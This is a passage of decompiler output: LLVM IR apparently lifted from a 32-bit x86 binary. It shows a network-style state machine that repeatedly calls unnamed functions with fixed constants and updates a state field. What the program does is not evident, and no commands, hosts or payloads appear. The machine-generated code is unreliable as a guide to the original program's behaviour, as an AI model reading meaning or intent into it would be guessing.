  %v2_8050c8c = inttoptr i32 %v1_8050c8c to i32*
  store i32 16384, i32* %v2_8050c8c, align 4
  %v1_8050c91 = add i32 %v0_8050c8c, 1888
  %v2_8050c91 = inttoptr i32 %v1_8050c91 to i32*
  %v3_8050c91 = load i32, i32* %v2_8050c91, align 4
  store i32 %v3_8050c91, i32* @esi, align 4
  %v2_8050c98 = add i32 %v0_8050c8c, -8
  %v3_8050c98 = inttoptr i32 %v2_8050c98 to i32*
  store i32 %v3_8050c91, i32* %v3_8050c98, align 4
  %v2_8050c99 = add i32 %v0_8050c8c, -12
  %v3_8050c99 = inttoptr i32 %v2_8050c99 to i32*
  store i32 %v3_8050c87, i32* %v3_8050c99, align 4
  %v0_8050c9a = load i32, i32* @edi, align 4
  %v1_8050c9a = add i32 %v0_8050c9a, 4
  %v2_8050c9a = inttoptr i32 %v1_8050c9a to i32*
  %v3_8050c9a = load i32, i32* %v2_8050c9a, align 4
  store i32 %v3_8050c9a, i32* @ebx, align 4
  %v2_8050c9d = add i32 %v0_8050c8c, -16
  %v3_8050c9d = inttoptr i32 %v2_8050c9d to i32*
  store i32 %v3_8050c9a, i32* %v3_8050c9d, align 4
  %v0_8050c9e = call i32 @function_8052924()
  store i32 %v0_8050c9e, i32* %eax.global-to-local, align 4
  %v0_8050ca3 = load i32, i32* @esp, align 4
  %v1_8050ca6 = add i32 %v0_8050ca3, 28
  %v2_8050ca6 = inttoptr i32 %v1_8050ca6 to i32*
  store i32 16384, i32* %v2_8050ca6, align 4
  %v1_8050cab = add i32 %v0_8050ca3, 24
  %v2_8050cab = inttoptr i32 %v1_8050cab to i32*
  store i32 2, i32* %v2_8050cab, align 4
  %v1_8050cad = add i32 %v0_8050ca3, 20
  %v2_8050cad = inttoptr i32 %v1_8050cad to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b06.10 to i32), i32* %v2_8050cad, align 4
  %v0_8050cb2 = load i32, i32* @edi, align 4
  %v1_8050cb2 = add i32 %v0_8050cb2, 4
  %v2_8050cb2 = inttoptr i32 %v1_8050cb2 to i32*
  %v3_8050cb2 = load i32, i32* %v2_8050cb2, align 4
  store i32 %v3_8050cb2, i32* %ecx.global-to-local, align 4
  %v2_8050cb5 = add i32 %v0_8050ca3, 16
  %v3_8050cb5 = inttoptr i32 %v2_8050cb5 to i32*
  store i32 %v3_8050cb2, i32* %v3_8050cb5, align 4
  %v0_8050cb6 = call i32 @function_8052924()
  store i32 %v0_8050cb6, i32* %eax.global-to-local, align 4
  %v0_8050cbb = load i32, i32* @esp, align 4
  %v1_8050cbb = inttoptr i32 %v0_8050cbb to i32*
  store i32 22, i32* %v1_8050cbb, align 4
  %v2_8050cc2 = call i32 @function_8051270(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050cc2, i32* %eax.global-to-local, align 4
  %v0_8050cca = load i32, i32* @edi, align 4
  %v1_8050cca = add i32 %v0_8050cca, 12
  %v2_8050cca = inttoptr i32 %v1_8050cca to i32*
  store i32 7, i32* %v2_8050cca, align 4
  br label %dec_label_pc_8050941

dec_label_pc_8050cd6:                             ; preds = %dec_label_pc_8050a57, %dec_label_pc_8050a4e, %dec_label_pc_8050a45, %dec_label_pc_8050a3c, %dec_label_pc_8050a2f
  %v1_8050cd6 = add i32 %v0_8050cd6, 1
  store i32 %v1_8050cd6, i32* @ebp, align 4
  %v10_8050cd9 = icmp eq i32 %v0_8050cd6, -2
  br i1 %v10_8050cd9, label %dec_label_pc_80505d3.loopexit12.loopexit, label %dec_label_pc_8050ce2

dec_label_pc_8050ce2:                             ; preds = %dec_label_pc_8050cd6
  %tmp151 = icmp slt i32 %v1_8050cd6, 1
  br i1 %tmp151, label %dec_label_pc_8050a73, label %dec_label_pc_8050cea

dec_label_pc_8050cea:                             ; preds = %dec_label_pc_8050ce2
  %v0_8050cea = load i32, i32* @esp, align 4
  %v1_8050ced = add i32 %v0_8050cea, -16
  %v2_8050ced = inttoptr i32 %v1_8050ced to i32*
  store i32 24, i32* %v2_8050ced, align 4
  %v2_8050cef = call i32 @function_80512f0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050cef, i32* %eax.global-to-local, align 4
  %v0_8050cf4 = load i32, i32* @esp, align 4
  %v1_8050cf4 = inttoptr i32 %v0_8050cf4 to i32*
  %v2_8050cf4 = load i32, i32* %v1_8050cf4, align 4
  store i32 %v2_8050cf4, i32* %eax.global-to-local, align 4
  %v3_8050cf4 = add i32 %v0_8050cf4, 4
  %v1_8050cf5 = inttoptr i32 %v3_8050cf4 to i32*
  %v1_8050cf6 = add i32 %v0_8050cf4, 1880
  store i32 %v1_8050cf6, i32* %edx.global-to-local, align 4
  store i32 %v1_8050cf6, i32* %v1_8050cf5, align 4
  store i32 24, i32* %v1_8050cf4, align 4
  %v3_8050d00 = call i32 @function_8051240(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8050d00, i32* %eax.global-to-local, align 4
  %v0_8050d05 = load i32, i32* @esp, align 4
  %v1_8050d05 = add i32 %v0_8050d05, -4
  %v2_8050d05 = inttoptr i32 %v1_8050d05 to i32*
  store i32 16384, i32* %v2_8050d05, align 4
  %v1_8050d0a = add i32 %v0_8050d05, 1880
  %v2_8050d0a = inttoptr i32 %v1_8050d0a to i32*
  %v3_8050d0a = load i32, i32* %v2_8050d0a, align 4
  store i32 %v3_8050d0a, i32* @esi, align 4
  %v2_8050d11 = add i32 %v0_8050d05, -8
  %v3_8050d11 = inttoptr i32 %v2_8050d11 to i32*
  store i32 %v3_8050d0a, i32* %v3_8050d11, align 4
  %v2_8050d12 = add i32 %v0_8050d05, -12
  %v3_8050d12 = inttoptr i32 %v2_8050d12 to i32*
  store i32 %v3_8050d00, i32* %v3_8050d12, align 4
  %v0_8050d13 = load i32, i32* @edi, align 4
  %v1_8050d13 = add i32 %v0_8050d13, 4
  %v2_8050d13 = inttoptr i32 %v1_8050d13 to i32*
  %v3_8050d13 = load i32, i32* %v2_8050d13, align 4
  store i32 %v3_8050d13, i32* @ebx, align 4
  %v2_8050d16 = add i32 %v0_8050d05, -16
  %v3_8050d16 = inttoptr i32 %v2_8050d16 to i32*
  store i32 %v3_8050d13, i32* %v3_8050d16, align 4
  %v0_8050d17 = call i32 @function_8052924()
  store i32 %v0_8050d17, i32* %eax.global-to-local, align 4
  %v0_8050d1c = load i32, i32* @esp, align 4
  %v1_8050d1f = add i32 %v0_8050d1c, 28
  %v2_8050d1f = inttoptr i32 %v1_8050d1f to i32*
  store i32 16384, i32* %v2_8050d1f, align 4
  %v1_8050d24 = add i32 %v0_8050d1c, 24
  %v2_8050d24 = inttoptr i32 %v1_8050d24 to i32*
  store i32 2, i32* %v2_8050d24, align 4
  %v1_8050d26 = add i32 %v0_8050d1c, 20
  %v2_8050d26 = inttoptr i32 %v1_8050d26 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b06.10 to i32), i32* %v2_8050d26, align 4
  %v0_8050d2b = load i32, i32* @edi, align 4
  %v1_8050d2b = add i32 %v0_8050d2b, 4
  %v2_8050d2b = inttoptr i32 %v1_8050d2b to i32*
  %v3_8050d2b = load i32, i32* %v2_8050d2b, align 4
  store i32 %v3_8050d2b, i32* %ecx.global-to-local, align 4
  %v2_8050d2e = add i32 %v0_8050d1c, 16
  %v3_8050d2e = inttoptr i32 %v2_8050d2e to i32*
  store i32 %v3_8050d2b, i32* %v3_8050d2e, align 4
  %v0_8050d2f = call i32 @function_8052924()
  store i32 %v0_8050d2f, i32* %eax.global-to-local, align 4
  %v0_8050d34 = load i32, i32* @esp, align 4
  %v1_8050d34 = inttoptr i32 %v0_8050d34 to i32*
  store i32 24, i32* %v1_8050d34, align 4
  %v2_8050d3b = call i32 @function_8051270(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050d3b, i32* %eax.global-to-local, align 4
  %v0_8050d43 = load i32, i32* @edi, align 4
  %v1_8050d43 = add i32 %v0_8050d43, 12
  %v2_8050d43 = inttoptr i32 %v1_8050d43 to i32*
  store i32 10, i32* %v2_8050d43, align 4
  br label %dec_label_pc_8050941

dec_label_pc_8050d4f:                             ; preds = %dec_label_pc_8050804, %dec_label_pc_80507fb, %dec_label_pc_80507f2, %dec_label_pc_80507e9, %dec_label_pc_80507dc
  %v1_8050d4f = add i32 %v0_8050d4f, 1
  store i32 %v1_8050d4f, i32* @ebp, align 4
  %v10_8050d52 = icmp eq i32 %v0_8050d4f, -2
  br i1 %v10_8050d52, label %dec_label_pc_80505d3.loopexit12.loopexit, label %dec_label_pc_8050d5b

dec_label_pc_8050d5b:                             ; preds = %dec_label_pc_8050d4f
  %tmp152 = icmp slt i32 %v1_8050d4f, 1
  br i1 %tmp152, label %dec_label_pc_8050a73, label %dec_label_pc_8050d63

dec_label_pc_8050d63:                             ; preds = %dec_label_pc_8050d5b
  %v0_8050d63 = load i32, i32* @esp, align 4
  %v1_8050d66 = add i32 %v0_8050d63, -16
  %v2_8050d66 = inttoptr i32 %v1_8050d66 to i32*
  store i32 23, i32* %v2_8050d66, align 4
  %v2_8050d68 = call i32 @function_80512f0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050d68, i32* %eax.global-to-local, align 4
  %v0_8050d6d = load i32, i32* @esp, align 4
  %v1_8050d6d = inttoptr i32 %v0_8050d6d to i32*
  %v2_8050d6d = load i32, i32* %v1_8050d6d, align 4
  store i32 %v2_8050d6d, i32* %eax.global-to-local, align 4
  %v3_8050d6d = add i32 %v0_8050d6d, 4
  %v1_8050d6e = inttoptr i32 %v3_8050d6d to i32*
  %v2_8050d6e = load i32, i32* %v1_8050d6e, align 4
  store i32 %v2_8050d6e, i32* %edx.global-to-local, align 4
  %v1_8050d6f = add i32 %v0_8050d6d, 1880
  store i32 %v1_8050d6f, i32* %eax.global-to-local, align 4
  store i32 %v1_8050d6f, i32* %v1_8050d6e, align 4
  store i32 23, i32* %v1_8050d6d, align 4
  %v3_8050d79 = call i32 @function_8051240(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8050d79, i32* %eax.global-to-local, align 4
  %v0_8050d7e = load i32, i32* @esp, align 4
  %v1_8050d7e = add i32 %v0_8050d7e, -4
  %v2_8050d7e = inttoptr i32 %v1_8050d7e to i32*
  store i32 16384, i32* %v2_8050d7e, align 4
  %v1_8050d83 = add i32 %v0_8050d7e, 1880
  %v2_8050d83 = inttoptr i32 %v1_8050d83 to i32*
  %v3_8050d83 = load i32, i32* %v2_8050d83, align 4
  store i32 %v3_8050d83, i32* @esi, align 4
  %v2_8050d8a = add i32 %v0_8050d7e, -8
  %v3_8050d8a = inttoptr i32 %v2_8050d8a to i32*
  store i32 %v3_8050d83, i32* %v3_8050d8a, align 4
  %v2_8050d8b = add i32 %v0_8050d7e, -12
  %v3_8050d8b = inttoptr i32 %v2_8050d8b to i32*
  store i32 %v3_8050d79, i32* %v3_8050d8b, align 4
  %v0_8050d8c = load i32, i32* @edi, align 4
  %v1_8050d8c = add i32 %v0_8050d8c, 4
  %v2_8050d8c = inttoptr i32 %v1_8050d8c to i32*
  %v3_8050d8c = load i32, i32* %v2_8050d8c, align 4
  store i32 %v3_8050d8c, i32* @ebx, align 4
  %v2_8050d8f = add i32 %v0_8050d7e, -16
  %v3_8050d8f = inttoptr i32 %v2_8050d8f to i32*
  store i32 %v3_8050d8c, i32* %v3_8050d8f, align 4
  %v0_8050d90 = call i32 @function_8052924()
  store i32 %v0_8050d90, i32* %eax.global-to-local, align 4
  %v0_8050d95 = load i32, i32* @esp, align 4
  %v1_8050d98 = add i32 %v0_8050d95, 28
  %v2_8050d98 = inttoptr i32 %v1_8050d98 to i32*
  store i32 16384, i32* %v2_8050d98, align 4
  %v1_8050d9d = add i32 %v0_8050d95, 24
  %v2_8050d9d = inttoptr i32 %v1_8050d9d to i32*
  store i32 2, i32* %v2_8050d9d, align 4
  %v1_8050d9f = add i32 %v0_8050d95, 20
  %v2_8050d9f = inttoptr i32 %v1_8050d9f to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b06.10 to i32), i32* %v2_8050d9f, align 4
  %v0_8050da4 = load i32, i32* @edi, align 4
  %v1_8050da4 = add i32 %v0_8050da4, 4
  %v2_8050da4 = inttoptr i32 %v1_8050da4 to i32*
  %v3_8050da4 = load i32, i32* %v2_8050da4, align 4
  store i32 %v3_8050da4, i32* %ecx.global-to-local, align 4
  %v2_8050da7 = add i32 %v0_8050d95, 16
  %v3_8050da7 = inttoptr i32 %v2_8050da7 to i32*
  store i32 %v3_8050da4, i32* %v3_8050da7, align 4
  %v0_8050da8 = call i32 @function_8052924()
  store i32 %v0_8050da8, i32* %eax.global-to-local, align 4
  %v0_8050dad = load i32, i32* @esp, align 4
  %v1_8050dad = inttoptr i32 %v0_8050dad to i32*
  store i32 23, i32* %v1_8050dad, align 4
  %v2_8050db4 = call i32 @function_8051270(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050db4, i32* %eax.global-to-local, align 4
  %v0_8050dbc = load i32, i32* @edi, align 4
  %v1_8050dbc = add i32 %v0_8050dbc, 12
  %v2_8050dbc = inttoptr i32 %v1_8050dbc to i32*
  store i32 9, i32* %v2_8050dbc, align 4
  br label %dec_label_pc_8050941

dec_label_pc_8050dc8:                             ; preds = %dec_label_pc_80505c7, %dec_label_pc_80505be, %dec_label_pc_80505b5, %dec_label_pc_80505ac, %dec_label_pc_805059f
  %v1_8050dc8 = add i32 %v0_8050dc8, 1
  store i32 %v1_8050dc8, i32* @ebp, align 4
  %v10_8050dcb = icmp eq i32 %v0_8050dc8, -2
  br i1 %v10_8050dcb, label %dec_label_pc_80505d3.loopexit12.loopexit, label %dec_label_pc_8050dd4

dec_label_pc_8050dd4:                             ; preds = %dec_label_pc_8050dc8
  %tmp153 = icmp slt i32 %v1_8050dc8, 1
  br i1 %tmp153, label %dec_label_pc_8050a73, label %dec_label_pc_8050ddc

dec_label_pc_8050ddc:                             ; preds = %dec_label_pc_8050dd4
  %v0_8050ddc = load i32, i32* @esp, align 4
  %v1_8050ddf = add i32 %v0_8050ddc, -16
  %v2_8050ddf = inttoptr i32 %v1_8050ddf to i32*
  store i32 21, i32* %v2_8050ddf, align 4
  %v2_8050de1 = call i32 @function_80512f0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050de1, i32* %eax.global-to-local, align 4
  %v0_8050de6 = load i32, i32* @esp, align 4
  %v1_8050de6 = inttoptr i32 %v0_8050de6 to i32*
  %v2_8050de6 = load i32, i32* %v1_8050de6, align 4
  store i32 %v2_8050de6, i32* %eax.global-to-local, align 4
  %v3_8050de6 = add i32 %v0_8050de6, 4
  %v1_8050de7 = inttoptr i32 %v3_8050de6 to i32*
  %v2_8050de7 = load i32, i32* %v1_8050de7, align 4
  store i32 %v2_8050de7, i32* %edx.global-to-local, align 4
  %v1_8050de8 = add i32 %v0_8050de6, 1880
  store i32 %v1_8050de8, i32* %ecx.global-to-local, align 4
  store i32 %v1_8050de8, i32* %v1_8050de7, align 4
  store i32 21, i32* %v1_8050de6, align 4
  %v3_8050df2 = call i32 @function_8051240(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8050df2, i32* %eax.global-to-local, align 4
  %v0_8050df7 = load i32, i32* @esp, align 4
  %v1_8050df7 = add i32 %v0_8050df7, -4
  %v2_8050df7 = inttoptr i32 %v1_8050df7 to i32*
  store i32 16384, i32* %v2_8050df7, align 4
  %v1_8050dfc = add i32 %v0_8050df7, 1880
  %v2_8050dfc = inttoptr i32 %v1_8050dfc to i32*
  %v3_8050dfc = load i32, i32* %v2_8050dfc, align 4
  store i32 %v3_8050dfc, i32* @esi, align 4
  %v2_8050e03 = add i32 %v0_8050df7, -8
  %v3_8050e03 = inttoptr i32 %v2_8050e03 to i32*
  store i32 %v3_8050dfc, i32* %v3_8050e03, align 4
  %v2_8050e04 = add i32 %v0_8050df7, -12
  %v3_8050e04 = inttoptr i32 %v2_8050e04 to i32*
  store i32 %v3_8050df2, i32* %v3_8050e04, align 4
  %v0_8050e05 = load i32, i32* @edi, align 4
  %v1_8050e05 = add i32 %v0_8050e05, 4
  %v2_8050e05 = inttoptr i32 %v1_8050e05 to i32*
  %v3_8050e05 = load i32, i32* %v2_8050e05, align 4
  store i32 %v3_8050e05, i32* @ebx, align 4
  %v2_8050e08 = add i32 %v0_8050df7, -16
  %v3_8050e08 = inttoptr i32 %v2_8050e08 to i32*
  store i32 %v3_8050e05, i32* %v3_8050e08, align 4
  %v0_8050e09 = call i32 @function_8052924()
  store i32 %v0_8050e09, i32* %eax.global-to-local, align 4
  %v0_8050e0e = load i32, i32* @esp, align 4
  %v1_8050e11 = add i32 %v0_8050e0e, 28
  %v2_8050e11 = inttoptr i32 %v1_8050e11 to i32*
  store i32 16384, i32* %v2_8050e11, align 4
  %v1_8050e16 = add i32 %v0_8050e0e, 24
  %v2_8050e16 = inttoptr i32 %v1_8050e16 to i32*
  store i32 2, i32* %v2_8050e16, align 4
  %v1_8050e18 = add i32 %v0_8050e0e, 20
  %v2_8050e18 = inttoptr i32 %v1_8050e18 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b06.10 to i32), i32* %v2_8050e18, align 4
  %v0_8050e1d = load i32, i32* @edi, align 4
  %v1_8050e1d = add i32 %v0_8050e1d, 4
  %v2_8050e1d = inttoptr i32 %v1_8050e1d to i32*
  %v3_8050e1d = load i32, i32* %v2_8050e1d, align 4
  store i32 %v3_8050e1d, i32* %ecx.global-to-local, align 4
  %v2_8050e20 = add i32 %v0_8050e0e, 16
  %v3_8050e20 = inttoptr i32 %v2_8050e20 to i32*
  store i32 %v3_8050e1d, i32* %v3_8050e20, align 4
  %v0_8050e21 = call i32 @function_8052924()
  store i32 %v0_8050e21, i32* %eax.global-to-local, align 4
  %v0_8050e26 = load i32, i32* @esp, align 4
  %v1_8050e26 = inttoptr i32 %v0_8050e26 to i32*
  store i32 21, i32* %v1_8050e26, align 4
  %v2_8050e2d = call i32 @function_8051270(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050e2d, i32* %eax.global-to-local, align 4
  %v0_8050e35 = load i32, i32* @edi, align 4
  %v1_8050e35 = add i32 %v0_8050e35, 12
  %v2_8050e35 = inttoptr i32 %v1_8050e35 to i32*
  store i32 6, i32* %v2_8050e35, align 4
  br label %dec_label_pc_8050941

dec_label_pc_8050e41:                             ; preds = %dec_label_pc_8050860
  %v2_8050e4b = load i32, i32* %v1_8050e4b, align 4
  store i32 %v2_8050e4b, i32* %eax.global-to-local, align 4
  %v0_8050e4c = load i32, i32* @edi, align 4
  %v1_8050e4c = add i32 %v0_8050e4c, 4
  %v2_8050e4c = inttoptr i32 %v1_8050e4c to i32*
  %v3_8050e4c = load i32, i32* %v2_8050e4c, align 4
  store i32 %v3_8050e4c, i32* %eax.global-to-local, align 4
  store i32 %v3_8050e4c, i32* %v1_8050e4b, align 4
  %v1_8050e50 = call i32 @function_80521e1(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050e50, i32* %eax.global-to-local, align 4
  %v0_8050e55 = load i32, i32* @edi, align 4
  %v1_8050e55 = add i32 %v0_8050e55, 284
  %v2_8050e55 = inttoptr i32 %v1_8050e55 to i8*
  %v3_8050e55 = load i8, i8* %v2_8050e55, align 1
  %v4_8050e55 = zext i8 %v3_8050e55 to i32
  %v6_8050e55 = and i32 %v1_8050e50, -256
  %v7_8050e55 = or i32 %v4_8050e55, %v6_8050e55
  %v1_8050e5e = add i32 %v7_8050e55, 1
  store i32 %v1_8050e5e, i32* %eax.global-to-local, align 4
  %v1_8050e5f = add i32 %v0_8050e55, 4
  %v2_8050e5f = inttoptr i32 %v1_8050e5f to i32*
  store i32 -1, i32* %v2_8050e5f, align 4
  %v0_8050e66 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050e66 = trunc i32 %v0_8050e66 to i8
  %v2_8050e66 = load i32, i32* @edi, align 4
  %v3_8050e66 = add i32 %v2_8050e66, 284
  %v4_8050e66 = inttoptr i32 %v3_8050e66 to i8*
  store i8 %v1_8050e66, i8* %v4_8050e66, align 1
  %v0_8050e6c = load i32, i32* %eax.global-to-local, align 4
  %v1_8050e6c = trunc i32 %v0_8050e6c to i8
  %v10_8050e6c = icmp eq i8 %v1_8050e6c, 10
  %v1_8050e6e = icmp eq i1 %v10_8050e6c, false
  br i1 %v1_8050e6e, label %dec_label_pc_8051000, label %dec_label_pc_8050e74

dec_label_pc_8050e74:                             ; preds = %dec_label_pc_8050e41
  store i32 -1, i32* @ebp, align 4
  %v0_8050e77 = load i32, i32* @edi, align 4
  %v1_8050e77 = add i32 %v0_8050e77, 284
  %v2_8050e77 = inttoptr i32 %v1_8050e77 to i8*
  store i8 0, i8* %v2_8050e77, align 1
  %v0_8050e7e = load i32, i32* @edi, align 4
  %v1_8050e7e = add i32 %v0_8050e7e, 12
  %v2_8050e7e = inttoptr i32 %v1_8050e7e to i32*
  store i32 0, i32* %v2_8050e7e, align 4
  br label %dec_label_pc_8050941

dec_label_pc_8050e8a:                             ; preds = %dec_label_pc_8050af4
  %v1_8050e8a = add i32 %v0_8050ae0, -4
  %v2_8050e8a = inttoptr i32 %v1_8050e8a to i32*
  store i32 16384, i32* %v2_8050e8a, align 4
  %v1_8050e8f = add i32 %v0_8050ae0, -8
  %v2_8050e8f = inttoptr i32 %v1_8050e8f to i32*
  store i32 3, i32* %v2_8050e8f, align 4
  %v1_8050e91 = add i32 %v0_8050ae0, 1879
  store i32 %v1_8050e91, i32* %eax.global-to-local, align 4
  %v0_8050e98 = load i32, i32* @ebx, align 4
  %v1_8050e98 = add i32 %v0_8050e98, 3
  store i32 %v1_8050e98, i32* @ebx, align 4
  %v2_8050e9b = add i32 %v0_8050ae0, -12
  %v3_8050e9b = inttoptr i32 %v2_8050e9b to i32*
  store i32 %v1_8050e91, i32* %v3_8050e9b, align 4
  %v0_8050e9c = load i32, i32* @ebp, align 4
  %v1_8050e9c = add i32 %v0_8050e9c, 3
  store i32 %v1_8050e9c, i32* @ebp, align 4
  %v0_8050e9f = load i32, i32* @edi, align 4
  %v1_8050e9f = add i32 %v0_8050e9f, 4
  %v2_8050e9f = inttoptr i32 %v1_8050e9f to i32*
  %v3_8050e9f = load i32, i32* %v2_8050e9f, align 4
  store i32 %v3_8050e9f, i32* @esi, align 4
  %v2_8050ea2 = add i32 %v0_8050ae0, -16
  %v3_8050ea2 = inttoptr i32 %v2_8050ea2 to i32*
  store i32 %v3_8050e9f, i32* %v3_8050ea2, align 4
  %v0_8050ea3 = call i32 @function_8052924()
  %v0_8050ea8 = load i32, i32* @esp, align 4
  %v1_8050ea8 = add i32 %v0_8050ea8, -4
  %v2_8050ea8 = inttoptr i32 %v1_8050ea8 to i32*
  store i32 16384, i32* %v2_8050ea8, align 4
  %v1_8050ead = add i32 %v0_8050ea8, -8
  %v2_8050ead = inttoptr i32 %v1_8050ead to i32*
  store i32 9, i32* %v2_8050ead, align 4
  %v1_8050eaf = add i32 %v0_8050ea8, 1863
  store i32 %v1_8050eaf, i32* %eax.global-to-local, align 4
  %v2_8050eb6 = add i32 %v0_8050ea8, -12
  %v3_8050eb6 = inttoptr i32 %v2_8050eb6 to i32*
  store i32 %v1_8050eaf, i32* %v3_8050eb6, align 4
  %v0_8050eb7 = load i32, i32* @edi, align 4
  %v1_8050eb7 = add i32 %v0_8050eb7, 4
  %v2_8050eb7 = inttoptr i32 %v1_8050eb7 to i32*
  %v3_8050eb7 = load i32, i32* %v2_8050eb7, align 4
  store i32 %v3_8050eb7, i32* %ecx.global-to-local, align 4
  %v2_8050eba = add i32 %v0_8050ea8, -16
  %v3_8050eba = inttoptr i32 %v2_8050eba to i32*
  store i32 %v3_8050eb7, i32* %v3_8050eba, align 4
  %v0_8050ebb = call i32 @function_8052924()
  store i32 %v0_8050ebb, i32* %eax.global-to-local, align 4
  %v0_8050ec0 = load i32, i32* @esp, align 4
  %v1_8050ec0 = add i32 %v0_8050ec0, 32
  %v0_8050ec3 = load i32, i32* @edi, align 4
  %v1_8050ec3 = add i32 %v0_8050ec3, 24
  %v2_8050ec3 = inttoptr i32 %v1_8050ec3 to i32*
  %v3_8050ec3 = load i32, i32* %v2_8050ec3, align 4
  store i32 %v3_8050ec3, i32* %edx.global-to-local, align 4
  %v0_805065e.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_805065e.backedge

dec_label_pc_8050ecb:                             ; preds = %dec_label_pc_805054a
  %v1_8050ecb = add i32 %v0_8050554, 1872
  %v2_8050ecb = inttoptr i32 %v1_8050ecb to i32*
  store i32 0, i32* %v2_8050ecb, align 4
  %v0_8050ed6 = load i32, i32* @esp, align 4
  %v1_8050ed6 = add i32 %v0_8050ed6, 1864
  %v2_8050ed6 = inttoptr i32 %v1_8050ed6 to i32*
  store i32 4, i32* %v2_8050ed6, align 4
  %v0_8050ee1 = load i32, i32* @esp, align 4
  %v1_8050ee4 = add i32 %v0_8050ee1, 1864
  %v2_8050eeb = add i32 %v0_8050ee1, -16
  %v3_8050eeb = inttoptr i32 %v2_8050eeb to i32*
  store i32 %v1_8050ee4, i32* %v3_8050eeb, align 4
  %v1_8050eec = add i32 %v0_8050ee1, 1872
  store i32 %v1_8050eec, i32* %eax.global-to-local, align 4
  %v2_8050ef3 = add i32 %v0_8050ee1, -20
  %v3_8050ef3 = inttoptr i32 %v2_8050ef3 to i32*
  store i32 %v1_8050eec, i32* %v3_8050ef3, align 4
  %v1_8050ef4 = add i32 %v0_8050ee1, -24
  %v2_8050ef4 = inttoptr i32 %v1_8050ef4 to i32*
  store i32 4, i32* %v2_8050ef4, align 4
  %v1_8050ef6 = add i32 %v0_8050ee1, -28
  %v2_8050ef6 = inttoptr i32 %v1_8050ef6 to i32*
  store i32 1, i32* %v2_8050ef6, align 4
  %v0_8050ef8 = load i32, i32* @edi, align 4
  %v1_8050ef8 = add i32 %v0_8050ef8, 4
  %v2_8050ef8 = inttoptr i32 %v1_8050ef8 to i32*
  %v3_8050ef8 = load i32, i32* %v2_8050ef8, align 4
  store i32 %v3_8050ef8, i32* %eax.global-to-local, align 4
  %v2_8050efb = add i32 %v0_8050ee1, -32
  %v3_8050efb = inttoptr i32 %v2_8050efb to i32*
  store i32 %v3_8050ef8, i32* %v3_8050efb, align 4
  %v0_8050efc = call i32 @function_8052850()
  store i32 %v0_8050efc, i32* %eax.global-to-local, align 4
  %v0_8050f01 = load i32, i32* @esp, align 4
  %v2_8050f04 = add i32 %v0_8050f01, 1904
  %v3_8050f04 = inttoptr i32 %v2_8050f04 to i32*
  %v4_8050f04 = load i32, i32* %v3_8050f04, align 4
  %v5_8050f04 = or i32 %v4_8050f04, %v0_8050efc
  %v6_8050f04 = icmp eq i32 %v5_8050f04, 0
  store i32 %v5_8050f04, i32* %eax.global-to-local, align 4
  %v1_8050f0b = icmp eq i1 %v6_8050f04, false
  br i1 %v1_8050f0b, label %dec_label_pc_8050f6c, label %dec_label_pc_8050f0d

dec_label_pc_8050f0d:                             ; preds = %dec_label_pc_8050ecb
  %v0_8050f0d = load i32, i32* @edi, align 4
  %v1_8050f0d = add i32 %v0_8050f0d, 12
  %v2_8050f0d = inttoptr i32 %v1_8050f0d to i32*
  store i32 2, i32* %v2_8050f0d, align 4
  %v1_8050f14 = call i32 @function_804f070(i32 ptrtoint (i32* @0 to i32))
  %v2_8050f14 = sext i32 %v1_8050f14 to i64
  %v0_8050f19 = load i16, i16* @global_var_805690c.49, align 4
  %v1_8050f19 = zext i16 %v0_8050f19 to i32
  %v0_8050f26 = load i32, i32* @global_var_80568d8.50, align 8
  store i32 %v0_8050f26, i32* @ebx, align 4
  store i32 %v1_8050f19, i32* %ecx.global-to-local, align 4
  %v8_8050f30 = zext i16 %v0_8050f19 to i64
  %v9_8050f30 = udiv i64 %v2_8050f14, %v8_8050f30
  %v10_8050f30 = trunc i64 %v9_8050f30 to i32
  store i32 %v10_8050f30, i32* %eax.global-to-local, align 4
  %v11_8050f30 = urem i64 %v2_8050f14, %v8_8050f30
  %v12_8050f30 = trunc i64 %v11_8050f30 to i32
  store i32 %v12_8050f30, i32* %edx.global-to-local, align 4
  %tmp154 = icmp slt i32 %v0_8050f26, 1
  br i1 %tmp154, label %dec_label_pc_8051031, label %dec_label_pc_8050f3a

dec_label_pc_8050f3a:                             ; preds = %dec_label_pc_8050f0d
  %v0_8050f3a = load i32, i32* @global_var_8056908.51, align 8
  store i32 %v0_8050f3a, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v1_8050f4f = trunc i64 %v11_8050f30 to i16
  br label %dec_label_pc_8050f4f

dec_label_pc_8050f43:                             ; preds = %dec_label_pc_8050f55, %dec_label_pc_8050f4f
  %v1_8050f43 = add i32 %v0_8050f43, 1
  store i32 %v1_8050f43, i32* %ecx.global-to-local, align 4
  %v1_8050f44 = add i32 %v0_8050f44, 16
  store i32 %v1_8050f44, i32* %eax.global-to-local, align 4
  %v12_8050f47 = icmp eq i32 %v1_8050f43, %v0_8050f26
  br i1 %v12_8050f47, label %dec_label_pc_8051031.loopexit, label %dec_label_pc_8050f4f

dec_label_pc_8050f4f:                             ; preds = %dec_label_pc_8050f43, %dec_label_pc_8050f3a
  %v0_8050f43 = phi i32 [ %v1_8050f43, %dec_label_pc_8050f43 ], [ 0, %dec_label_pc_8050f3a ]
  %v0_8050f44 = phi i32 [ %v1_8050f44, %dec_label_pc_8050f43 ], [ %v0_8050f3a, %dec_label_pc_8050f3a ]
  %v3_8050f4f = add i32 %v0_8050f44, 8
  %v4_8050f4f = inttoptr i32 %v3_8050f4f to i16*
  %v5_8050f4f = load i16, i16* %v4_8050f4f, align 2
